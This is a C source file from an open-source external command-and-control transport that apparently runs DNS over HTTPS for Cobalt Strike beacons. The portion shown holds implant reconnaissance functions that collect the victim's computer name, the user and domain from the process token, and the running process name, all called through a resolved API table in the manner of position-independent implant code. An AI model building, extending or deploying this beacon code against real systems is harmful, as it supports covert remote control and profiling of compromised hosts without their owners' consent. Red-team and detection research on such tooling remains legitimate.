/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "common.h"

/*-
 *
 * BeaconComputer
 *
 * Purpose:
 *
 * Returns a string containing the name
 * of the computer Beacon is running on
 *
-*/
DEFINESEC(B) PVOID BeaconComputer( PBEACON_INSTANCE Ins )
{
	DWORD Res = 1;
	PVOID Str = 0;
	ULONG Len = 0;

	if ( !Ins->api.GetComputerNameA( NULL, &Len ) )
	{
		if ((Str = Ins->api.LocalAlloc( LPTR, Len )))
		{
			if ( Ins->api.GetComputerNameA( Str, &Len ) )
			{
				Res = 0;
			};
		};
	};

	return Res != 1 ? 
	       Str : Ins->api.LocalFree( Str );
};

/*-
 *
 * BeaconUsername
 *
 * Returns a string containing the name
 * of the user that Beacon is running
 * as.
 *
-*/
DEFINESEC(B) PVOID BeaconUsername( PBEACON_INSTANCE Ins )
{
	PTOKEN_USER Usr = 0;
	HANDLE      Tok = 0;
	DWORD       Res = 1;
	PVOID       Wdp = 0;
	PVOID       Wup = 0;
	ULONG       Typ = 0;
	ULONG       Wdl = 0;
	ULONG       Wul = 0;
	ULONG       Len = 0;

	if ( !Ins->api.OpenThreadToken( NtCurrentThread(), TOKEN_QUERY, FALSE, &Tok ) )
	{
		if ( ! Ins->api.OpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &Tok ) )
		{
			return NULL;
		};
	};

	if ( !Ins->api.GetTokenInformation( Tok, TokenUser, NULL, 0, &Len ) )
	{
		if ((Usr = Ins->api.LocalAlloc( LPTR, Len )))
		{
			if ( Ins->api.GetTokenInformation( Tok, TokenUser, Usr, Len, &Len ) )
			{
				if ( ! Ins->api.LookupAccountSidA(
							NULL,
							Usr->User.Sid,
							NULL,
							&Wul,
							NULL,
							&Wdl,
							( PSID_NAME_USE )&Typ
							))
				{
					if ((Wdp = Ins->api.LocalAlloc( LPTR, Wdl )))
					{
						if ((Wup = Ins->api.LocalAlloc( LPTR, Wul )))
						{
							if ( Ins->api.LookupAccountSidA(
										NULL,
										Usr->User.Sid,
										Wup,
										&Wul,
										Wdp,
										&Wdl,
										( PSID_NAME_USE ) &Typ
										))
							{
								Res = 0;
							};
						};
						Ins->api.LocalFree( Wdp );
					};
				};
			};
			Ins->api.LocalFree( Usr );
		};
	};

	Ins->api.CloseHandle( Tok ); 

	return Res != 1 ? 
	       Wup : Ins->api.LocalFree( Wup );
};

/*-
 *
 * BeaconProcess
 *
 * Purpose:
 *
 * Returns a string containing the 
 * Beacon process name in ANSI.
 *
-*/
DEFINESEC(B) PVOID BeaconProcess( PBEACON_INSTANCE Ins )
{
	PPEB  Peb = 0;
	PWSTR Img = 0;
	PVOID Str = 0;
	ULONG Len = 0;

	Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
	Img = Peb->ProcessParameters->ImagePathName.Buffer;
	Img = CPTR( UPTR( Ins->api.wcsrchr( Img, L'\\' ) ) );
	Img = Img + 1;

	if ((Str = Ins->api.LocalAlloc( LPTR, Ins->api.wcslen( Img ) + 1 )))
	{
		if (( Ins->api.wcstombs( Str, Img, Ins->api.wcslen( Img ) ) ) != -1 )
		{
			return Str;
		};
		Ins->api.LocalFree( Str );
	};
	return NULL;
};
